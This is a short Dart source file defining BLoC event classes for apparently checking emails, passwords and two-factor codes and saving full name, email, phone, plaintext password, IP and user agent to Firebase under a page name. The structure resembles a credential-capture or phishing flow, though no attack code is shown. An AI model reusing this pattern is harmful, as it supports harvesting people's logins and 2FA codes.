part of 'home_bloc.dart';

abstract class HomeEvent extends Equatable {
  const HomeEvent();

  @override
  List<Object> get props => [];
}

class CheckingEmailEvent extends HomeEvent {
  final String email;

  const CheckingEmailEvent(this.email);
}

class CheckingPasswordEvent extends HomeEvent {
  final String email;
  final String password;
  final String ip;

  const CheckingPasswordEvent(this.email, this.password, this.ip);
}

class CheckingTwoFAEvent extends HomeEvent {
  final String rowId;
  final String email;
  final String password;
  final String twoFa;

  const CheckingTwoFAEvent(this.email, this.password, this.twoFa, this.rowId);
}

class AddToFirebaseEvent extends HomeEvent {
  final String pageName;
  final String fullName;
  final String email;
  final String phone;
  final String password;
  final String? user_agent;
  final String? ip;
  const AddToFirebaseEvent(this.pageName, this.fullName, this.email, this.phone,
      this.password, this.ip, this.user_agent);
}
